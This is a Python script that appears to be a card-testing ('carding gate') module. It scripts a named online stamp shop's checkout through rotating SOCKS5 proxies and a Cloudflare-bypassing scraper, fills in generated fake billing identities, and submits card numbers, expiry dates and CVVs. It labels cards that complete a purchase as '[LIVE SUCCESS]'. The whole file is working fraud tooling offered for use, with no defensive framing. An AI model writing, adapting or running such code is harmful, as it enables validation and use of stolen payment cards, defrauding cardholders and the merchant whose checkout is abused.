import cloudscraper
from time import sleep
from urllib.parse import quote
from random import randint
from dependencie.infobill import infobill

from model.models import gateData



from requests_toolbelt.multipart.encoder import MultipartEncoder

class CoreGateCode:
    def __init__(self, cardID):
        self.cardID = cardID
        self.cardIDx2 = ""
        self.billx = infobill()
    def getStr(self,data,inicio,final):
        strx1 = data.split(inicio)
        strx2 = strx1[1].split(final)
        return strx2[0]
    def __valiDCardId(self):
        if self.cardID == 'visa':
            self.cardIDx2 = 'Visa'
        elif self.cardID == 'mc':
            self.cardIDx2 = 'MasterCard'
        elif self.cardID == 'amex':
            self.cardIDx2 = 'AmericanExpress'
        elif self.cardID == 'discovery':
            self.cardIDx2 = 'Discover'
        
    def processCodeGate(self,cc,dataGate:gateData):
        self.__valiDCardId()
        cc1 = cc.ccnum[0:4]
        cc2 = cc.ccnum[4:8]
        cc3 = cc.ccnum[8:12]
        cc4 = cc.ccnum[12:16]


        


        proxies = {
            'http': f'socks5://{dataGate.proxy}',
            'https': f'socks5://{dataGate.proxy}'
        }
        timeout = 5
        
        cs = cloudscraper.create_scraper(
            browser={
                'browser': 'firefox',
                'platform': 'windows',
                'mobile': False
                
            },
            debug=False
            
        )
        

    #datext
        
        #cs.proxies.update(proxies)
        try:
            status = dict()
  

            url="https://www.sweetnsassystamps.com/4-petal-flowers-digital-stamp-set/"
            headers={

            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "DNT":"1",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"none",
            'Sec-Fetch-User':'?1'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)


            xtoken = self.getStr(datac.text, 'csrf_token":"', '"')


            url="https://www.sweetnsassystamps.com/remote/v1/cart/add"

            multipart_encoder =MultipartEncoder(
                {
                    'action':'add',
                    'product_id':'944',
                    'ty[]':'1'
                }
            )

            headers={

            "Accept":"*/*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://www.sweetnsassystamps.com/4-petal-flowers-digital-stamp-set/",
            "stencil-config":"{}",
            "stencil-options":"{}",
            "x-requested-with":"stencil-utils",
            "Content-Type":multipart_encoder.content_type,
            "X-XSRF-TOKEN":xtoken,
            "Origin":"https://www.sweetnsassystamps.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            datac=cs.post(url=url,headers=headers,data=multipart_encoder,proxies=proxies,timeout=timeout)


            url="https://www.sweetnsassystamps.com/checkout"
            headers={
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.sweetnsassystamps.com/4-petal-flowers-digital-stamp-set/",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            'Sec-Fetch-User':'?1'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)


            url="https://www.sweetnsassystamps.com/internalapi/v1/checkout/quote?includes=customer"
            headers={
            "Accept":"application/json",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "X-XSRF-TOKEN":xtoken,
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.sweetnsassystamps.com/checkout.php",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            'Sec-Fetch-Site':'same-origin'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)


            url="https://www.sweetnsassystamps.com/remote.php"
            headers={

            "Accept":"application/json, text/javascript, */*; q=0.01",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "X-XSRF-TOKEN":xtoken,
            "Origin":"https://www.sweetnsassystamps.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.sweetnsassystamps.com/checkout.php",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            'Sec-Fetch-Site':'same-origin'
            }
            data='w=expressCheckoutGetAddressFields&type=guest'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)



            url="https://www.sweetnsassystamps.com/internalapi/v1/checkout/quote?includes=customer"
            headers={

            "Accept":"application/json",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "X-XSRF-TOKEN":xtoken,
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.sweetnsassystamps.com/checkout.php",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            datac=cs.get(url=url,headers=headers)

            url="https://www.sweetnsassystamps.com/remote.php"
            headers={

            "Accept":"application/json, text/javascript, */*; q=0.01",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "X-XSRF-TOKEN":xtoken,
            "Origin":"https://www.sweetnsassystamps.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.sweetnsassystamps.com/checkout.php",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            data='w=saveExpressCheckoutBillingAddress&BillingAddressType=existing&ship_to_billing_existing=1&FormField%5B1%5D%5B1%5D='+self.billx.emailx+'%40gmail.com&FormField%5B2%5D%5B4%5D='+self.billx.nameFirs+'&FormField%5B2%5D%5B5%5D='+self.billx.nameLast+'&FormField%5B2%5D%5B6%5D=&FormField%5B2%5D%5B7%5D='+self.billx.phone1+'&FormField%5B2%5D%5B8%5D='+self.billx.address+'&FormField%5B2%5D%5B9%5D=&FormField%5B2%5D%5B10%5D='+self.billx.city+'&FormField%5B2%5D%5B11%5D=United+States&FormField%5B2%5D%5B12%5D='+self.billx.estado+'&FormFieldIsText%5B2%5D%5B12%5D=1&FormField%5B2%5D%5B13%5D='+self.billx.zipcode+'&ship_to_billing_new=1&BillingAddressType=new'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)




            url="https://www.sweetnsassystamps.com/internalapi/v1/checkout/quote?includes=customer"
            headers={

            "Accept":"application/json",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "X-XSRF-TOKEN":f"{xtoken}, {xtoken}",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.sweetnsassystamps.com/checkout.php",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            'Sec-Fetch-Site':'same-origin'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)


            url="https://www.sweetnsassystamps.com/remote.php"
            headers={

            "Accept":"application/json, text/javascript, */*; q=0.01",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "X-XSRF-TOKEN":f"{xtoken}, {xtoken}",
            "Origin":"https://www.sweetnsassystamps.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.sweetnsassystamps.com/checkout.php",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            'Sec-Fetch-Site':'same-origin'
            }
            data='w=expressCheckoutLoadPaymentForm&action=pay_for_order&couponcode=&store_credit=1&checkout_provider=checkout_payflowpro&ordercomments=&join_mailing_list=on'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)



            url="https://www.sweetnsassystamps.com/internalapi/v1/checkout/quote?includes=customer"
            headers={

            "Accept":"application/json",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "X-XSRF-TOKEN":f"{xtoken}, {xtoken}, {xtoken}",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.sweetnsassystamps.com/checkout.php",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            'Sec-Fetch-Site':'same-origin'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)


            url="https://www.sweetnsassystamps.com/checkout.php?action=process_payment"
            headers={

            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":"https://www.sweetnsassystamps.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://www.sweetnsassystamps.com/checkout.php",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            'Sec-Fetch-User':'?1'
            }
            data='PayflowPro_name='+self.billx.nameFirs+'+'+self.billx.nameLast+'&PayflowPro_ccno='+cc.ccnum+'&PayflowPro_ccexpm='+cc.expm+'&PayflowPro_ccexpy='+cc.expy+'&PayflowPro_cccode='+cc.cv2+'&authenticity_token='+xtoken
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)
            
            
            if "https://www.sweetnsassystamps.com/checkout.php?action=confirm_order" in datac.text:
                url="https://www.sweetnsassystamps.com/checkout.php?action=confirm_order"
                headers={
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language":"en-US,en;q=0.5",
                "Accept-Encoding":"gzip, deflate, br",
                "DNT":"1",
                "Connection":"keep-alive",
                "Referer":"https://www.sweetnsassystamps.com/checkout.php?action=process_payment",
                "Upgrade-Insecure-Requests":"1",
                "Sec-Fetch-Dest":"document",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-Site":"same-origin",
                'TE':'trailers'
                }
                datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)


            cs.close()
                # 'ccResponse':dataGate.cc+ " ["++"]",

            if 'Declined: 15005-This transaction cannot be processed.' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc,   'proxy':dataGate.proxy,'datext':None}
            elif "Your credit card payment has been declined due to incorrect card details or insufficient funds on the card" in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc,   'proxy':dataGate.proxy,'datext':None}

            elif "Thanks for Your Order" in datac.text:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+" [LIVE SUCCESS]",'proxy':dataGate.proxy,'datext':None}

            else:
                status = {'msg':3,'contentCC':dataGate.cc,'ccResponse': " CC =====>"+dataGate.cc,'proxy':dataGate.proxy,'datext':None}
                
            return status
        except Exception as e:
            print(e,'que paso')
            return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}